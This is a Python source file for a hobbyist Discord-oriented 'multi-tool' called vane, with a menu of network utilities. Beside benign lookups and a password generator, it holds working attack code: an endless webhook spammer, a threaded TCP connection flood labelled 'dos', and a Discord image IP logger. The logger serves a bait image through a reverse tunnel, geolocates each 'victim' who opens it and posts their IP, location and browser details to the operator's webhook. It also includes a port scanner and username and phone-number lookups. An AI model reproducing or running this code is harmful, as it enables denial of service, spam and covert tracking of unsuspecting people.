import base64
import datetime
import os
import secrets
import socket
import string
import subprocess
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib import parse
from urllib.parse import urlparse

import httpagentparser
import httpx
import hwid
import phonenumbers
import requests
from phonenumbers import carrier, geocoder, timezone
from PIL import Image
from PIL.ExifTags import TAGS
from rich.console import Console

console = Console()

ip = requests.get("https://api.ipify.org?format=json")
data = ip.json()
cleanip = data["ip"]
now = datetime.datetime.now().hour  # noqa: DTZ005
now_full = datetime.datetime.now().strftime("%H:%M")  # noqa: DTZ005

morning = "good morning! what would you like to do."
afternoon = "good afternoon! what would you like to do."
evening = "good evening! what would you like to do."

spacer = "      "
def start():
    console.print(
        r"""
        ,--.  ,--.,--,--.,--,--,  ,---.  
        \  `'  /' ,-.  ||      \| .-. : 
        \    / \ '-'  ||  ||  |\   --. 
        `--'   `--`--'`--''--' `----' 
                                        """,
        style="cyan",
    )

    if now < 12:
        console.print(morning, style="cyan")
    elif now < 18:
        console.print(afternoon, style="cyan")
    else:
        console.print(evening, style="cyan")

    console.print(f"ip: {cleanip}", style="cyan")
    console.print(f"time: {now_full}", style="cyan")
    console.print(
        f"1 - webhook spam{spacer}11 - discord image logger (in dev)\n2 - dos{spacer}         12 - temp email\n3 - ip lookup{spacer}   13 - metadata tools\n4 - dns lookup{spacer}  14 - password gen\n5 - whois{spacer}       15 - discord hypesquad changer\n6 - ip -> hostname    16 - show hwid\n7 - email records     17 - base64 decode + encode\n8 - ssl certs{spacer}   18 - url inspector\n9 - username lookup   19 - port scanner\n10 - number lookup\nq - exit              https://discord.gg/j5MKxynwbV",
        style="cyan",
    )
    choice = console.input("[cyan]| [/cyan]").strip()
    while not choice:
        choice = console.input("[cyan]| [/cyan]").strip()

    if choice == "1":
        webhook_url = console.input("[cyan]webhook url: [/cyan]").strip()
        webhook_text = console.input("[cyan]text: [/cyan]").strip()
        data = {"content": webhook_text}

        def webhookspam():
            num = 1
            while True:
                r = requests.post(webhook_url, json=data)
                console.print(f"{num}. {r.status_code}")
                num += 1

        webhookspam()

    elif choice == "2":
        from concurrent.futures import ThreadPoolExecutor
        user_input = console.input("[cyan]ip/url:  [/cyan]").strip()

        parse_target = user_input
        if not parse_target.startswith(("http://", "https://")):
            parse_target = "http://" + parse_target

        try:
            parsed = urllib.parse.urlparse(parse_target)
            host = parsed.hostname
            port = parsed.port
            scheme = (
                urllib.parse.urlparse(user_input).scheme
                if user_input.startswith(("http://", "https://"))
                else "http"
            )

            if port is None:
                port = 443 if scheme == "https" else 80

            if not host:
                raise ValueError("could not parse a valid hostname or ip address.")

        except Exception as e:  # noqa: BLE001
            console.print(f"[red]invalid input format: {e}[/red]")
            port = None

        if port is not None:
            console.print(f"[yellow]testing connection to {host} on port {port}...[/yellow]")

            stop_event = threading.Event()
            lock = threading.Lock()
            counter = 1

            workers = 15

            def worker():
                nonlocal counter
                while not stop_event.is_set():
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                            # sock.settimeout(0.001)
                            sock.connect((host, port))

                            with lock:
                                console.print(f"{counter}.  attacking {host}:{port}", style="cyan")
                                counter += 1

                    except TimeoutError:
                        console.print("[red]connection timeout[/red]")
                        continue

                    except ConnectionRefusedError:
                        console.print(f"[red]connection refused on port {port}.[/red]")
                        stop_event.set() 
                        break

                    except Exception as e:  # noqa: BLE001
                        console.print(f"network error: {e}", style="cyan")
                        continue

            with ThreadPoolExecutor(max_workers=workers) as ex:
                futures = [ex.submit(worker) for _ in range(workers)]







    elif choice == "3":
        ip = console.input("[cyan]ip: [/cyan]")

        def ip_lookup():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(f"http://ip-api.com/json/{ip}")
                console.print(r.json(), style="cyan")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="cyan")
        ip_lookup()
        input("\npress enter to exit...")

    elif choice == "4":
        url = console.input("[cyan]url: [/cyan]")

        def dns_lookup():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(
                        "https://dns-lookup.com/api/dns",
                        params={"domain": f"{url}", "types": "A,MX,TXT"},
                    )
                console.print(r.json(), style="cyan")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="cyan")

        dns_lookup()
        input("\npress enter to exit...")

    elif choice == "5":
        url = console.input("[cyan]url: [/cyan]")

        def whois():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(
                        "https://dns-lookup.com/api/whois", params={"domain": f"{url}"}
                    )
                data = r.json()
                data.pop("raw", None)
                console.print(data, style="cyan")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="cyan")

        whois()
        input("\npress enter to exit...")

    elif choice == "6":
        dns = console.input("[cyan]dns: [/cyan]")

        def reversedns():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(
                        "https://dns-lookup.com/api/reverse-dns", params={"ip": f"{dns}"}
                    )
                console.print(r.json(), style="cyan")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="cyan")

        reversedns()
        input("\npress enter to exit...")

    elif choice == "7":
        domain = console.input("[cyan]domain: [/cyan]")

        def checkemail():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(
                        "https://dns-lookup.com/api/email", params={"domain": f"{domain}"}
                    )
                console.print(r.json(), style="cyan")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="cyan")

        checkemail()
        input("\npress enter to exit...")

    elif choice == "8":
        domain = console.input("[cyan]domain: [/cyan]")

        def sslcerts():
            try:
                with console.status("sending...", spinner="aesthetic"):
                    r = requests.get(
                        "https://dns-lookup.com/api/ssl", params={"domain": f"{domain}"}
                    )
                console.print(r.json(), style="cyan")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="cyan")
        sslcerts()
        input("\npress enter to exit...")

    elif choice == "9":
        username = console.input("[cyan]username: [/cyan]")
        WMN_URL = (
            "https://raw.githubusercontent.com/WebBreacher/WhatsMyName/main/wmn-data.json"
        )

        def username_search():
            try:
                data = requests.get(WMN_URL, timeout=10).json()
                sites = data["sites"]
                total = len(sites)
                results = []
                with console.status(
                    f"checking sites... (0/{total})", spinner="aesthetic"
                ) as status:
                    for i, site in enumerate(sites, 1):
                        status.update(f"checking sites... ({i}/{total})")
                        url = site["uri_check"].replace("{account}", username)
                        try:
                            r = requests.get(
                                url, timeout=5, headers={"User-Agent": "Mozilla/5.0"}
                            )
                            found = (
                                site["e_string"] in r.text
                                and r.status_code == site["e_code"]
                            )
                        except requests.exceptions.RequestException:
                            continue
                        if found:
                            results.append({"site": site["name"], "url": url})
                console.print(results, style="cyan")
            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="cyan")

        username_search()
        input("\npress enter to exit...")

    elif choice == "10":
        number = console.input("[cyan]phone number: [/cyan]").strip()
        if number.startswith("+") == False:
            number = "+" + number

        def checknumber():
            try:
                parsed = phonenumbers.parse(number)
                LINE_TYPES = {
                    0: "fixed_line",
                    1: "mobile",
                    2: "fixed_line_or_mobile",
                    3: "toll_free",
                    4: "premium_rate",
                    5: "shared_cost",
                    6: "voip",
                    7: "personal_number",
                    8: "pager",
                    9: "uan",
                    10: "voicemail",
                    27: "unknown",
                }
                info = (
                    f"valid: {phonenumbers.is_valid_number(parsed)}\n"
                    f"carrier: {carrier.name_for_number(parsed, 'en')}\n"
                    f"region: {geocoder.description_for_number(parsed, 'en')}\n"
                    f"timezone: {', '.join(timezone.time_zones_for_number(parsed))}\n"
                    f"line_type: {LINE_TYPES.get(phonenumbers.number_type(parsed), 'unknown')}\n"
                    f"is_possible: {phonenumbers.is_possible_number(parsed)}\n"
                    f"national_number: {parsed.national_number}\n"
                    f"region_code: {phonenumbers.region_code_for_number(parsed)}\n"
                    f"e164: {phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)}\n"
                    f"national_format: {phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)}\n"
                    f"international_format: {phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}"
                )
                console.print(info, style="cyan")
            except phonenumbers.NumberParseException as e:
                console.print(f"parse failed: {e}", style="cyan")

        checknumber()
        input("\npress enter to exit...")

    elif choice == "11":
        webhook = console.input("[cyan]webhook url: [/cyan]").strip()

        console.print("\nps: dont use a service like catbox.moe for your image. cannot be a gif", style="cyan")
        image_url = console.input("[cyan]image url: [/cyan]")

        console.print("your subdomain will be what comes before '.localexpose.net' e.g tenor.localexpose.net", style="cyan")
        subdomain = console.input("[cyan]subdomain: [/cyan]")

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
            "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }

        bindata = httpx.get(image_url, headers=headers).content
        buggedimg = False 
        buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')



        def format():
            def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
                return {
            "username": "vane ip logger",
            "content": " ",
            "embeds": [
                {
                "title": "vane strikes again!",
                "color": 000000,
                "description": "a victim opened the original image. you can find their info below.",
                "author": {
                    "name": "vane"
                },
                "fields": [
                    {
                    "name": "ip info",
                    "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
                    "inline": True
                    },
                    {
                    "name": "advanced info",
                    "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `look below!`\n```yaml\n{useragent}\n```",
                    "inline": False
                    }
                ]
                }
            ],
            }

            def prev(ip,uag):
                return {
                "username": "vane ip logger",
                "content": "",
                "embeds": [
                    {
                    "title": "vane alert!",
                    "color": 000000,
                    "description": f"discord previewed a vane image! You can expect an ip soon.\n\n**IP:** `{ip}`\n**UserAgent:** `look below!`\n```yaml\n{uag}```",
                    "author": {
                        "name": "vane"
                    },
                    "fields": [
                    ]
                    }
                ],
                }


            
            class handler(BaseHTTPRequestHandler):
                        def do_GET(self):
                            s = self.path
                            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                            try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
                            except Exception: data = bindata  # noqa: BLE001
                            useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'no user agent found!'
                            os, browser = httpagentparser.simple_detect(useragent)
                            if self.headers.get('x-forwarded-for', '').startswith(('35','34','104.196')):
                                if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
                                else: pass
                            else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
                            return  # noqa: PLR1711

            try: 
                server = HTTPServer(('0.0.0.0', 9000), handler) 
                console.print("image server running. ctrl + c to stop \n")
                tunnel = subprocess.Popen(['ssh', '-R', f'{subdomain}:3000:localhost:9000', 'localexpose.net'])
                server.serve_forever() 
            except KeyboardInterrupt:
                tunnel.terminate()
                tunnel.kill()
                os._exit(1)
                os._exit(1)

        format()

    elif choice == "12":
        def tempemail():
            try:
                addr = console.input("[cyan]email name: [/cyan]").strip().lower()

                if "@" not in addr:
                    addr += "@catchmail.io"

                console.print(f"watching {addr}...", style="cyan")

                seen = set()

                while True:
                    r = requests.get(
                        "https://api.catchmail.io/api/v1/mailbox",
                        params={"address": addr},
                        timeout=5
                    )

                    r.raise_for_status()
                    data = r.json()

                    for email in data.get("messages", []):
                        if email["id"] in seen:
                            continue

                        seen.add(email["id"])

                        mail = requests.get(
                            f"https://api.catchmail.io/api/v1/message/{email['id']}",
                            params={"mailbox": addr},
                            timeout=5
                        )

                        mail.raise_for_status()
                        full = mail.json()

                        console.print(
                            f"""
from: {email['from']}
subject: {email['subject']}
date: {email['date']}
id: {email['id']}

text:
{full['body']['text'] or full['body']['html']}
                """,
                            style="cyan"
                        )

                    time.sleep(1)

            except requests.exceptions.RequestException as e:
                console.print(f"request failed: {e}", style="red")

        tempemail()

    elif choice == "13":
        path = Path(console.input("[cyan]path to image: [/cyan]").strip().strip("'\""))
        def exiftools():
            try:
                img = Image.open(path)
                exif = img.getexif()
                for tag_id, value in exif.items():
                    tag = TAGS.get(tag_id, tag_id)
                    console.print(f"{tag}: {value}", style="cyan")

                clear_question = console.input("\n[cyan]clear? (y or n) [/cyan]")

                img = Image.open(path)

                if clear_question.lower().startswith("y"):
                    clean = img.copy()

                    output = path.with_name(f"wiped_{path.name}")

                    console.print(f"[green]saving as {output}[/green]")

                    clean.save(output, exif=b"")
                else:
                    console.print("not clearing.", style="cyan")
            except Exception as e:  # noqa: BLE001
                console.print(f"invalid path. {e}", style="cyan")
        exiftools()
        input("\npress enter to exit...")

    elif choice =="14":
        def password_gen():
            try:
                length = int(input("\nlength (default 20): ") or 20)
            except ValueError:
                length = 20

            charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"

            for i in range(8):
                pwd = ''.join(secrets.choice(charset) for _ in range(length))
                print(f"{i+1:02}: {pwd}")
        
        password_gen()
        console.input("\n[cyan]press enter to quit... [/cyan]")

    elif choice =="15":
        def change_hypesquad_badge(token, badge_id):
            url = "https://discord.com/api/v9/hypesquad/online"
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }
            data = {"house": badge_id}

            try:
                response = requests.post(url, headers=headers, json=data)
                response.raise_for_status()
                console.print(f"hypesquad badge changed to id {badge_id}")

            except requests.exceptions.HTTPError as err:
                console.print(f"error changing hypesquad badge: {err}")

            except Exception as e:  # noqa: BLE001
                console.print(f"error: {e}")


        if __name__ == "__main__":
            token = console.input("discord account token: ")
            badge_id = console.input(
                "hypesquad badge id (1: bravery, 2: brilliance, 3: balance): "
            )

            while badge_id not in ["1", "2", "3"]:
                console.print("invalid hypesquad badge id. enter 1, 2, or 3.")
                console.input("\n[cyan]press enter to quit... [/cyan]")
            else:  # noqa: PLW0120
                change_hypesquad_badge(token, badge_id)
                console.input("\n[cyan]press enter to quit... [/cyan]")

    elif choice == "16":
        def showhwid():
            console.print(f"hwid: {hwid.get_hwid()}")
        showhwid()
        console.input("\n[cyan]press enter to quit... [/cyan]")

    elif choice == "17":
        ch = console.input("[cyan]1 - encode    2 - decode? [/cyan]")

        if ch == "1":
            text = console.input("text: ")
            enc_text = base64.b64encode(text.encode("utf-8")).decode("utf-8")
            console.print(f"encoded text:\n{enc_text}", style="cyan")
            console.input("\n[cyan]press enter to quit... [/cyan]")

        elif ch == "2":
            enc_text = console.input("text (base64): ")
            dec_text = base64.b64decode(enc_text.encode("utf-8")).decode("utf-8")
            console.print(f"decoded text:\n{dec_text}", style="cyan")
            console.input("\n[cyan]press enter to quit... [/cyan]")


    elif choice == "18":
        url = console.input("[cyan]url: [/cyan]").strip()

        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        try:
            parsed = urlparse(url)  # noqa: F823

            if not parsed.netloc:
                console.print("[red]invalid url[/red]")
                return

            with console.status("[cyan]inspecting url...[/cyan]"):
                response = httpx.get(
                    url,
                    follow_redirects=True,
                    timeout=10,
                    headers={
                        "User-Agent": "vane/1.0"
                    }
                )

            console.print("\n[bold cyan]url inspector[/bold cyan]\n")

            console.print(f"[cyan]url:[/cyan]          {url}")
            console.print(f"[cyan]final url:[/cyan]   {response.url}")
            console.print(
                f"[cyan]status:[/cyan]       "
                f"{response.status_code} {response.reason_phrase}"
            )
            console.print(
                f"[cyan]https:[/cyan]        "
                f"{'Yes' if response.url.scheme == 'https' else 'No'}"
            )
            console.print(
                f"[cyan]content-type:[/cyan] "
                f"{response.headers.get('content-type', 'Unknown')}"
            )
            console.print(
                f"[cyan]server:[/cyan]       "
                f"{response.headers.get('server', 'Unknown')}"
            )

            content_length = response.headers.get("content-length")

            if content_length:
                console.print(
                    f"[cyan]size:[/cyan]         {content_length} bytes"
                )
            else:
                console.print(
                    f"[cyan]size:[/cyan]         {len(response.content)} bytes"
                )

            console.print(
                f"[cyan]redirects:[/cyan]    {len(response.history)}"
            )

            console.print("\n[bold cyan]security headers[/bold cyan]")

            security_headers = {
                "strict-transport-security": "HSTS",
                "content-security-policy": "CSP",
                "x-frame-options": "X-Frame-Options",
                "x-content-type-options": "X-Content-Type-Options"
            }

            for header, name in security_headers.items():
                if header in response.headers:
                    console.print(f"[green][+] {name}[/green]")
                else:
                    console.print(f"[yellow][-] {name}[/yellow]")
            console.input("\n[cyan]press enter to quit... [/cyan]")

        except httpx.RequestError as e:
            console.print(f"[red]request failed: {e}[/red]")

        except Exception as e:  # noqa: BLE001
            console.print(f"[red]error: {e}[/red]")


    elif choice == "19":
        import socket
        from concurrent.futures import ThreadPoolExecutor, as_completed
        from urllib.parse import urlparse

        from rich.progress import Progress

        host = console.input("[cyan]host: [/cyan]").strip()

        if host.startswith(("http://", "https://")):
            host = urlparse(host).hostname

        if not host:
            console.print("[red]invalid host[/red]")
            console.input("\n[cyan]press enter to quit... [/cyan]")
        else:
            start = 1
            end = 1024
            max_workers = 50

            console.print(
                f"\n[cyan]scanning {host} ({start}-{end})...[/cyan]\n"
            )

            def scan_port(port):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)

                try:
                    result = sock.connect_ex((host, port))

                    if result == 0:
                        try:
                            service = socket.getservbyport(port, "tcp")
                        except OSError:
                            service = "unknown"

                        return port, service

                except OSError:
                    return None

                finally:
                    sock.close()

                return None

            open_ports = []

            try:
                with Progress() as progress:
                    task = progress.add_task(
                        "[cyan]scanning ports...",
                        total=end - start + 1
                    )

                    with ThreadPoolExecutor(max_workers=max_workers) as executor:
                        futures = [
                            executor.submit(scan_port, port)
                            for port in range(start, end + 1)
                        ]

                        for future in as_completed(futures):
                            result = future.result()

                            if result:
                                port, service = result
                                open_ports.append((port, service))

                                console.print(
                                    f"[green][+] {port:<5} open[/green] "
                                    f"[dim]({service})[/dim]"
                                )

                            progress.advance(task)

                open_ports.sort()

                console.print(
                    f"\n[cyan]scanned {end - start + 1} ports | "
                    f"{len(open_ports)} open[/cyan]"
                )

            except OSError as e:
                console.print(f"[red]scanner error: {e}[/red]")

            console.input("\n[cyan]press enter to quit... [/cyan]")


    else:
        print("quitting")

start()
